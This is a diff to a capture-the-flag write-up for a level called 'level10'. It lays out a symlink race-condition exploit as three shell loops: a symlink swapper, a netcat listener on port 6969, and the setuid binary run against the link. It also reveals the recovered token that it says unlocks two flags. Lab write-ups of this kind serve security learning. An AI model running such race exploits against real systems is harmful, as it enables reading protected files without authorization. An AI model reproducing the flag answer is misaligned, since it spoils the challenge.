@@ -30,13 +30,16 @@ Simple program explanation
 ## Resolution
  * We use a symbolic link as file, which we constantly switch between `token` and a file we got access to.
  * We can do this by launching these 3 commands at the same in different terminals:
-   * ```
+```sh
 while true; do ln -sf /home/user/level10/token /var/crash/bg_du_75 && ln -sf /home/user/level10/level10 /var/crash/bg_du_75; done
- ```
-   * ```
+```
+
+```sh
 while true; do nc -l 6969; done
- ```
-   * ```
+```
+
+```sh
 while true; do ./level10 /var/crash/bg_du_75 0.0.0.0; done
- ```
+```
+
  * We then get `woupa2yuojeeaaed06riuj63c` which can be use for flag10 AND flag11 !!!!
